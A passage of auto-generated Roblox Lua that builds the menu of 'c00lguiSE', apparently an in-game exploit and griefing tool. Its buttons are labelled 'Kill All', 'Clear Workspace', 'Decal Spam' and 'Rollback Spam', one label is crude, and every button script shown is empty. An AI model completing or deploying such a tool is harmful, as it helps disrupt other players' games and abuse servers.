G2L["a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a5"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["a5"]["Name"] = [[Button]];
G2L["a5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a5"]["Text"] = [[Building Tools]];
G2L["a5"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["a6"] = Instance.new("LocalScript", G2L["a5"]);
G2L["a6"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["a7"] = Instance.new("TextButton", G2L["a3"]);
G2L["a7"]["TextWrapped"] = true;
G2L["a7"]["BorderSizePixel"] = 0;
G2L["a7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["TextSize"] = 15;
G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["a7"]["RichText"] = true;
G2L["a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a7"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["a7"]["Name"] = [[Button]];
G2L["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["Text"] = [[Click Teleport]];
G2L["a7"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["a8"] = Instance.new("LocalScript", G2L["a7"]);
G2L["a8"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["a9"] = Instance.new("TextButton", G2L["a3"]);
G2L["a9"]["TextWrapped"] = true;
G2L["a9"]["BorderSizePixel"] = 0;
G2L["a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["TextSize"] = 15;
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["a9"]["RichText"] = true;
G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a9"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["a9"]["Name"] = [[Button]];
G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a9"]["Text"] = [[Linked Sword]];
G2L["a9"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["aa"] = Instance.new("LocalScript", G2L["a9"]);
G2L["aa"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["ab"] = Instance.new("TextButton", G2L["a3"]);
G2L["ab"]["TextWrapped"] = true;
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ab"]["TextSize"] = 15;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["ab"]["RichText"] = true;
G2L["ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ab"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["ab"]["Name"] = [[Button]];
G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ab"]["Text"] = [[Firebrand]];
G2L["ab"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["ac"] = Instance.new("LocalScript", G2L["ab"]);
G2L["ac"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["ad"] = Instance.new("TextButton", G2L["a3"]);
G2L["ad"]["TextWrapped"] = true;
G2L["ad"]["BorderSizePixel"] = 0;
G2L["ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ad"]["TextSize"] = 15;
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["ad"]["RichText"] = true;
G2L["ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ad"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["ad"]["Name"] = [[Button]];
G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ad"]["Text"] = [[Venomshank]];
G2L["ad"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["ae"] = Instance.new("LocalScript", G2L["ad"]);
G2L["ae"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["af"] = Instance.new("TextButton", G2L["a3"]);
G2L["af"]["TextWrapped"] = true;
G2L["af"]["BorderSizePixel"] = 0;
G2L["af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["af"]["TextSize"] = 15;
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["af"]["RichText"] = true;
G2L["af"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["af"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["af"]["Name"] = [[Button]];
G2L["af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["af"]["Text"] = [[Windforce]];
G2L["af"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["b0"] = Instance.new("LocalScript", G2L["af"]);
G2L["b0"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["b1"] = Instance.new("TextButton", G2L["a3"]);
G2L["b1"]["TextWrapped"] = true;
G2L["b1"]["BorderSizePixel"] = 0;
G2L["b1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b1"]["TextSize"] = 15;
G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["b1"]["RichText"] = true;
G2L["b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b1"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["b1"]["Name"] = [[Button]];
G2L["b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b1"]["Text"] = [[Illumina]];
G2L["b1"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["b2"] = Instance.new("LocalScript", G2L["b1"]);
G2L["b2"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["b3"] = Instance.new("TextButton", G2L["a3"]);
G2L["b3"]["TextWrapped"] = true;
G2L["b3"]["BorderSizePixel"] = 0;
G2L["b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b3"]["TextSize"] = 15;
G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["b3"]["RichText"] = true;
G2L["b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b3"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["b3"]["Name"] = [[Button]];
G2L["b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b3"]["Text"] = [[Punch Tool]];
G2L["b3"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["b4"] = Instance.new("LocalScript", G2L["b3"]);
G2L["b4"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["b5"] = Instance.new("TextButton", G2L["a3"]);
G2L["b5"]["TextWrapped"] = true;
G2L["b5"]["BorderSizePixel"] = 0;
G2L["b5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b5"]["TextSize"] = 15;
G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["b5"]["RichText"] = true;
G2L["b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b5"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["b5"]["Name"] = [[Button]];
G2L["b5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b5"]["Text"] = [[Portal Gun]];
G2L["b5"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["b6"] = Instance.new("LocalScript", G2L["b5"]);
G2L["b6"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["b7"] = Instance.new("TextButton", G2L["a3"]);
G2L["b7"]["TextWrapped"] = true;
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b7"]["TextSize"] = 15;
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["b7"]["RichText"] = true;
G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b7"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["b7"]["Name"] = [[Button]];
G2L["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["Text"] = [[Telekinesis]];
G2L["b7"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["b8"] = Instance.new("LocalScript", G2L["b7"]);
G2L["b8"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["b9"] = Instance.new("TextButton", G2L["a3"]);
G2L["b9"]["TextWrapped"] = true;
G2L["b9"]["BorderSizePixel"] = 0;
G2L["b9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b9"]["TextSize"] = 15;
G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["b9"]["RichText"] = true;
G2L["b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b9"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["b9"]["Name"] = [[Button]];
G2L["b9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b9"]["Text"] = [[Jerk Off]];
G2L["b9"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["ba"] = Instance.new("LocalScript", G2L["b9"]);
G2L["ba"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["bb"] = Instance.new("TextButton", G2L["a3"]);
G2L["bb"]["TextWrapped"] = true;
G2L["bb"]["BorderSizePixel"] = 0;
G2L["bb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bb"]["TextSize"] = 15;
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["bb"]["RichText"] = true;
G2L["bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bb"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["bb"]["Name"] = [[Button]];
G2L["bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bb"]["Text"] = [[F3X *CLIENT*]];
G2L["bb"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
G2L["bc"] = Instance.new("LocalScript", G2L["bb"]);
G2L["bc"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X
G2L["bd"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["bd"]["Visible"] = false;
G2L["bd"]["Active"] = true;
G2L["bd"]["BorderSizePixel"] = 0;
G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["bd"]["Name"] = [[F3X]];
G2L["bd"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["bd"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["bd"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["bd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bd"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.F3X.UIListLayout
G2L["be"] = Instance.new("UIListLayout", G2L["bd"]);
G2L["be"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["be"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["be"]["Wraps"] = true;
G2L["be"]["Padding"] = UDim.new(0.01, 0);
G2L["be"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["be"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["bf"] = Instance.new("TextButton", G2L["bd"]);
G2L["bf"]["TextWrapped"] = true;
G2L["bf"]["BorderSizePixel"] = 0;
G2L["bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bf"]["TextSize"] = 15;
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["bf"]["RichText"] = true;
G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["bf"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["bf"]["Name"] = [[Button]];
G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["Text"] = [[Set Skybox]];
G2L["bf"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["c0"] = Instance.new("LocalScript", G2L["bf"]);
G2L["c0"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["c1"] = Instance.new("TextButton", G2L["bd"]);
G2L["c1"]["TextWrapped"] = true;
G2L["c1"]["BorderSizePixel"] = 0;
G2L["c1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["TextSize"] = 15;
G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["c1"]["RichText"] = true;
G2L["c1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c1"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["c1"]["Name"] = [[Button]];
G2L["c1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c1"]["Text"] = [[Decal Spam]];
G2L["c1"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["c2"] = Instance.new("LocalScript", G2L["c1"]);
G2L["c2"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["c3"] = Instance.new("TextButton", G2L["bd"]);
G2L["c3"]["TextWrapped"] = true;
G2L["c3"]["BorderSizePixel"] = 0;
G2L["c3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c3"]["TextSize"] = 15;
G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["c3"]["RichText"] = true;
G2L["c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c3"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["c3"]["Name"] = [[Button]];
G2L["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c3"]["Text"] = [[Particle Spam]];
G2L["c3"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["c4"] = Instance.new("LocalScript", G2L["c3"]);
G2L["c4"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["c5"] = Instance.new("TextButton", G2L["bd"]);
G2L["c5"]["TextWrapped"] = true;
G2L["c5"]["BorderSizePixel"] = 0;
G2L["c5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c5"]["TextSize"] = 15;
G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["c5"]["RichText"] = true;
G2L["c5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c5"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["c5"]["Name"] = [[Button]];
G2L["c5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c5"]["Text"] = [[Kill All]];
G2L["c5"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["c6"] = Instance.new("LocalScript", G2L["c5"]);
G2L["c6"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["c7"] = Instance.new("TextButton", G2L["bd"]);
G2L["c7"]["TextWrapped"] = true;
G2L["c7"]["BorderSizePixel"] = 0;
G2L["c7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c7"]["TextSize"] = 15;
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["c7"]["RichText"] = true;
G2L["c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c7"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["c7"]["Name"] = [[Button]];
G2L["c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c7"]["Text"] = [[Unanchor All]];
G2L["c7"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["c8"] = Instance.new("LocalScript", G2L["c7"]);
G2L["c8"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["c9"] = Instance.new("TextButton", G2L["bd"]);
G2L["c9"]["TextWrapped"] = true;
G2L["c9"]["BorderSizePixel"] = 0;
G2L["c9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c9"]["TextSize"] = 15;
G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["c9"]["RichText"] = true;
G2L["c9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c9"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["c9"]["Name"] = [[Button]];
G2L["c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c9"]["Text"] = [[Create Baseplate]];
G2L["c9"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["ca"] = Instance.new("LocalScript", G2L["c9"]);
G2L["ca"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["cb"] = Instance.new("TextButton", G2L["bd"]);
G2L["cb"]["TextWrapped"] = true;
G2L["cb"]["BorderSizePixel"] = 0;
G2L["cb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cb"]["TextSize"] = 15;
G2L["cb"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["cb"]["RichText"] = true;
G2L["cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cb"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["cb"]["Name"] = [[Button]];
G2L["cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cb"]["Text"] = [[Clear Workspace]];
G2L["cb"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["cc"] = Instance.new("LocalScript", G2L["cb"]);
G2L["cc"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["cd"] = Instance.new("TextButton", G2L["bd"]);
G2L["cd"]["TextWrapped"] = true;
G2L["cd"]["BorderSizePixel"] = 0;
G2L["cd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cd"]["TextSize"] = 15;
G2L["cd"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["cd"]["RichText"] = true;
G2L["cd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cd"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["cd"]["Name"] = [[Button]];
G2L["cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cd"]["Text"] = [[Rollback Spam]];
G2L["cd"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["ce"] = Instance.new("LocalScript", G2L["cd"]);
G2L["ce"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["cf"] = Instance.new("TextButton", G2L["bd"]);
G2L["cf"]["TextWrapped"] = true;
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["TextSize"] = 15;
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["cf"]["RichText"] = true;
G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["cf"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["cf"]["Name"] = [[Button]];
G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Text"] = [[Anti-Robloxian]];
G2L["cf"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["d0"] = Instance.new("LocalScript", G2L["cf"]);
G2L["d0"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["d1"] = Instance.new("TextButton", G2L["bd"]);
G2L["d1"]["TextWrapped"] = true;
G2L["d1"]["BorderSizePixel"] = 0;
G2L["d1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d1"]["TextSize"] = 15;
G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["d1"]["RichText"] = true;
G2L["d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d1"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["d1"]["Name"] = [[Button]];
G2L["d1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d1"]["Text"] = [[Invisibility: OFF]];
G2L["d1"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["d2"] = Instance.new("LocalScript", G2L["d1"]);
G2L["d2"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["d3"] = Instance.new("TextButton", G2L["bd"]);
G2L["d3"]["TextWrapped"] = true;
G2L["d3"]["BorderSizePixel"] = 0;
G2L["d3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d3"]["TextSize"] = 15;
G2L["d3"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["d3"]["RichText"] = true;
G2L["d3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d3"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["d3"]["Name"] = [[Button]];
G2L["d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d3"]["Text"] = [[Disco Mesh]];
G2L["d3"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["d4"] = Instance.new("LocalScript", G2L["d3"]);
G2L["d4"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button
G2L["d5"] = Instance.new("TextButton", G2L["bd"]);
G2L["d5"]["TextWrapped"] = true;
G2L["d5"]["BorderSizePixel"] = 0;
G2L["d5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d5"]["TextSize"] = 15;
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["d5"]["RichText"] = true;
G2L["d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d5"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["d5"]["Name"] = [[Button]];
G2L["d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d5"]["Text"] = [[Fire Parts]];
G2L["d5"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
G2L["d6"] = Instance.new("LocalScript", G2L["d5"]);
G2L["d6"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Settings
G2L["d7"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["d7"]["Visible"] = false;
G2L["d7"]["Active"] = true;
G2L["d7"]["BorderSizePixel"] = 0;
G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["d7"]["Name"] = [[Settings]];
G2L["d7"]["Size"] = UDim2.new(0, 267, 0, 200);
G2L["d7"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["d7"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d7"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Settings.WalkSpeedInput
G2L["d8"] = Instance.new("TextBox", G2L["d7"]);
G2L["d8"]["Name"] = [[WalkSpeedInput]];
G2L["d8"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["d8"]["BorderSizePixel"] = 2;
G2L["d8"]["TextWrapped"] = true;
G2L["d8"]["TextSize"] = 14;
G2L["d8"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d8"]["PlaceholderText"] = [[WalkSpeed]];
G2L["d8"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["d8"]["Position"] = UDim2.new(0.04983, 0, 0, 0);
G2L["d8"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["d8"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.UIListLayout
G2L["d9"] = Instance.new("UIListLayout", G2L["d7"]);
G2L["d9"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["d9"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["d9"]["Wraps"] = true;
G2L["d9"]["Padding"] = UDim.new(0.01, 0);
G2L["d9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["d9"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Settings.JumpPowerInput
G2L["da"] = Instance.new("TextBox", G2L["d7"]);
G2L["da"]["Name"] = [[JumpPowerInput]];
G2L["da"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["da"]["BorderSizePixel"] = 2;
G2L["da"]["TextWrapped"] = true;
G2L["da"]["TextSize"] = 14;
G2L["da"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["da"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["da"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["da"]["PlaceholderText"] = [[JumpPower]];
G2L["da"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["da"]["Position"] = UDim2.new(0.38076, 0, 0, 0);
G2L["da"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["da"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.GravityInput
G2L["db"] = Instance.new("TextBox", G2L["d7"]);
G2L["db"]["Name"] = [[GravityInput]];
G2L["db"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
